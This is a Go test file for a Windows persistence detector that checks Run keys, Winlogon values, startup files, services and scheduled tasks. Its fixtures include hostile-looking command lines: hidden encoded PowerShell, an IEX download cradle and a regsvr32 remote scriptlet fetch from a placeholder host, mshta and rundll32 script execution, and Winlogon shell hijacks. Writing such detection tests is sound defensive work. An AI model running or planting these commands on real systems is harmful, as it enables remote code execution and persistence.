package winpersist

import (
	"context"
	"io/fs"
	"slices"
	"sync"
	"testing"
	"unicode/utf16"

	"github.com/codext4fn-afk/sentineltriage/internal/attack"
	"github.com/codext4fn-afk/sentineltriage/internal/engine"
	"github.com/codext4fn-afk/sentineltriage/internal/finding"
)

type fakeSource struct {
	autoruns []Autorun
	winlogon []RegValue
	startup  []StartupFile
	services []Service
	tasks    []Task
	gaps     []Gap
}

func (f fakeSource) Autoruns() ([]Autorun, []Gap)          { return f.autoruns, f.gaps }
func (f fakeSource) Winlogon() ([]RegValue, []Gap)         { return f.winlogon, nil }
func (f fakeSource) StartupFiles() ([]StartupFile, []Gap)  { return f.startup, nil }
func (f fakeSource) Services() ([]Service, []Gap)          { return f.services, nil }
func (f fakeSource) Tasks(context.Context) ([]Task, []Gap) { return f.tasks, nil }

type sink struct {
	mu sync.Mutex
	f  []finding.Finding
	d  []engine.Degradation
}

func (s *sink) Emit(f finding.Finding)       { s.mu.Lock(); defer s.mu.Unlock(); s.f = append(s.f, f) }
func (s *sink) Degrade(d engine.Degradation) { s.mu.Lock(); defer s.mu.Unlock(); s.d = append(s.d, d) }

func run(t *testing.T, src Source) *sink {
	t.Helper()
	s := &sink{}
	if err := FromSource(src).Run(context.Background(), s); err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, f := range s.f {
		if err := f.Validate(); err != nil {
			t.Errorf("%s: invalid finding: %v", f.RuleID, err)
		}
		if err := attack.Validate(f.Techniques); err != nil {
			t.Errorf("%s: %v", f.RuleID, err)
		}
	}
	return s
}

func rules(s *sink) []string {
	var r []string
	for _, f := range s.f {
		r = append(r, f.RuleID)
	}
	slices.Sort(r)
	return r
}

const runKey = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

func TestClassifyCommand(t *testing.T) {
	cases := []struct {
		cmd  string
		want string // expected technique beyond the location technique; "" = staging; "-" = no finding
	}{
		{`powershell.exe -NoP -w hidden -enc SQBFAFgA`, "T1059.001"},
		{`pwsh -EncodedCommand ZQBjAGgAbwA=`, "T1059.001"},
		{`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x')"`, "T1059.001"},
		{`mshta.exe vbscript:Execute("x")`, "T1218.005"},
		{`regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll`, "T1218.010"},
		{`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`, "T1218.011"},
		{`C:\Users\bob\AppData\Local\Temp\upd.exe /silent`, ""},
		{`C:\Users\Public\svc.exe`, ""},
		{`%TEMP%\a.exe`, ""},
		{`"C:\Program Files\Vendor\agent.exe" --background`, "-"},
		{`C:\Windows\System32\SecurityHealthSystray.exe`, "-"},
		{`powershell.exe -ExecutionPolicy Bypass -File C:\Program Files\Tools\x.ps1`, "-"},
	}
	for _, c := range cases {
		v, ok := classifyCommand(c.cmd)
		switch {
		case c.want == "-":
			if ok {
				t.Errorf("%q flagged (%s), want benign", c.cmd, v.reason)
			}
		case !ok:
			t.Errorf("%q not flagged", c.cmd)
		case c.want == "":
			if len(v.techniques) != 0 {
				t.Errorf("%q: techniques %v, want staging only", c.cmd, v.techniques)
			}
		case !slices.Contains(v.techniques, c.want):
			t.Errorf("%q: techniques %v, want %s", c.cmd, v.techniques, c.want)
		}
	}
}

func TestRunKeys(t *testing.T) {
	s := run(t, fakeSource{autoruns: []Autorun{
		{Key: runKey, Name: "OneDrive", Command: `"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background`},
		{Key: runKey, Name: "Updater", Command: `powershell -w hidden -enc AAAA`},
		{Key: runKey, Name: "", Command: `C:\Users\Public\x.exe`},
	}})
	if len(s.f) != 2 {
		t.Fatalf("findings = %v, want 2", rules(s))
	}
	if !slices.Contains(s.f[0].Techniques, "T1547.001") || s.f[0].Location.Artifact != "Updater" {
		t.Errorf("unexpected finding: %+v", s.f[0])
	}
	if s.f[1].Location.Artifact != "(Default)" {
		t.Errorf("default value name not normalized: %q", s.f[1].Location.Artifact)
	}
}

func TestWinlogon(t *testing.T) {
	key := `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`
	clean := run(t, fakeSource{winlogon: []RegValue{
		{Key: key, Name: "Userinit", Value: `C:\Windows\system32\userinit.exe,`},
		{Key: key, Name: "Shell", Value: "explorer.exe"},
	}})
	if len(clean.f) != 0 {
		t.Errorf("default Winlogon values flagged: %v", rules(clean))
	}
	dirty := run(t, fakeSource{winlogon: []RegValue{
		{Key: key, Name: "Userinit", Value: `C:\Windows\system32\userinit.exe, C:\ProgramData\x.exe`},
		{Key: key, Name: "Shell", Value: "explorer.exe, evil.exe"},
	}})
	if len(dirty.f) != 2 || dirty.f[0].Evidence["unexpected"] != `C:\ProgramData\x.exe` {
		t.Errorf("modified Winlogon not detected: %+v", dirty.f)
	}
}

func TestStartupFiles(t *testing.T) {
	dir := `C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
	s := run(t, fakeSource{startup: []StartupFile{
		{Path: dir + `\Slack.lnk`},
		{Path: dir + `\desktop.ini`},
		{Path: dir + `\update.vbs`},
		{Path: dir + `\helper.exe`},
	}})
	if len(s.f) != 2 {
		t.Fatalf("findings = %d, want 2 (shortcuts and desktop.ini are benign)", len(s.f))
	}
	if s.f[0].Confidence != finding.ConfidenceMedium || s.f[1].Confidence != finding.ConfidenceLow {
		t.Errorf("script vs binary confidence wrong: %v / %v", s.f[0].Confidence, s.f[1].Confidence)
	}
}

func TestServices(t *testing.T) {
	key := `HKLM\SYSTEM\CurrentControlSet\Services\`
	s := run(t, fakeSource{services: []Service{
		{Key: key + "Good", Name: "Good", ImagePath: `"C:\Program Files\Vendor\svc.exe" -k`},
		{Key: key + "Svchost", Name: "Svchost", ImagePath: `C:\Windows\system32\svchost.exe -k netsvcs`},
		{Key: key + "Unquoted", Name: "Unquoted", ImagePath: `C:\Program Files\Some Vendor\svc.exe -k run`},
		{Key: key + "Staged", Name: "Staged", ImagePath: `C:\Windows\Temp\svc.exe`},
	}})
	want := []string{"host.persistence.service-suspicious", "host.persistence.service-unquoted-path"}
	if got := rules(s); !slices.Equal(got, want) {
		t.Fatalf("rules = %v, want %v", got, want)
	}
	for _, f := range s.f {
		if f.RuleID == "host.persistence.service-suspicious" && f.Severity != finding.SeverityHigh {
			t.Errorf("service in staging dir severity = %v, want high", f.Severity)
		}
	}
}

func TestTasks(t *testing.T) {
	s := run(t, fakeSource{tasks: []Task{
		{Name: `\Microsoft\Windows\Defrag\ScheduledDefrag`, File: `C:\Windows\System32\Tasks\Microsoft\Windows\Defrag\ScheduledDefrag`,
			Command: `%windir%\system32\defrag.exe`, Arguments: "-c -h -o"},
		{Name: `\Updater`, File: `C:\Windows\System32\Tasks\Updater`,
			Command: "powershell.exe", Arguments: "-nop -w hidden -enc SQBFAFgA"},
	}})
	if len(s.f) != 1 || s.f[0].Location.Artifact != `\Updater` || !slices.Contains(s.f[0].Techniques, "T1053.005") {
		t.Errorf("task findings = %+v", s.f)
	}
}

func TestGapsFilterNotExist(t *testing.T) {
	s := run(t, fakeSource{gaps: []Gap{
		{Scope: runKey + "Once", Err: &fs.PathError{Op: "open", Path: "x", Err: fs.ErrNotExist}},
		{Scope: `C:\Windows\System32\Tasks`, Err: &fs.PathError{Op: "open", Path: "x", Err: fs.ErrPermission}},
	}})
	if len(s.d) != 1 || s.d[0].Reason != engine.ReasonPermission {
		t.Errorf("gaps = %+v, want only the permission gap", s.d)
	}
}

func TestParseTaskUTF16(t *testing.T) {
	doc := `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions Context="Author">
    <Exec><Command>C:\Users\Public\a.exe</Command><Arguments>/q</Arguments></Exec>
  </Actions>
</Task>`
	u := utf16.Encode([]rune(doc))
	b := []byte{0xFF, 0xFE}
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	tasks, err := parseTask(`\T`, "f", b)
	if err != nil {
		t.Fatal(err)
	}
	if len(tasks) != 1 || tasks[0].Command != `C:\Users\Public\a.exe` || tasks[0].Arguments != "/q" {
		t.Errorf("parsed %+v", tasks)
	}
}

func TestUnquotedWithSpace(t *testing.T) {
	cases := map[string]bool{
		`C:\Program Files\A B\x.exe -k`:      true,
		`"C:\Program Files\A B\x.exe" -k`:    false,
		`C:\Windows\system32\svchost.exe -k`: false,
		`\SystemRoot\System32\drivers\x.sys`: false,
		``:                                   false,
	}
	for in, want := range cases {
		if _, got := unquotedWithSpace(in); got != want {
			t.Errorf("unquotedWithSpace(%q) = %v, want %v", in, got, want)
		}
	}
}
